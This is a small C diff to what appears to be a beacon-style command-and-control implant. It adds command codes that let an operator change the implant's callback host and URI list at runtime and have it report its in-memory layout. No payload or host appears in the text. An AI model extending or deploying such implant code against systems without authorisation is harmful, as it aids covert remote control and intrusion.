@@ -8,6 +8,7 @@
 #include "spawn_trace.h"
 #include "bformat.h"
 #include "datastore.h"
+#include "hostcfg.h"
 
 #define COMMAND_SPAWN          0x01
 #define COMMAND_SHELL          0x02
@@ -129,6 +130,11 @@
 #define COMMAND_JOB_SPAWN_USER_X86 0x76
 #define COMMAND_JOB_SPAWN_USER_X64 0x77
 #define COMMAND_JOB_DATA           0x78
+/* tier-3 item10 (4.10 beacon_config host): runtime host/uri list overlay.
+ * Our extension id; official number unknown, both ends are ours. */
+#define COMMAND_HOST_CONFIG        0x79
+/* tier-3 item11 (4.12 beacon_info): in-memory layout self-report */
+#define COMMAND_BEACON_INFO        0x7A
 
 typedef struct {
 	unsigned int   type;
@@ -473,6 +479,12 @@ void process_message(unsigned int type, char * buffer, int length) {
 		break;
 	case COMMAND_JOB_DATA:
 		command_job_data(buffer, length);
+		break;
+	case COMMAND_HOST_CONFIG:
+		command_host_config(buffer, length, command_shell_callback);
+		break;
+	case COMMAND_BEACON_INFO:
+		command_beacon_info(buffer, length, command_shell_callback);
 		break;
 	}
 }
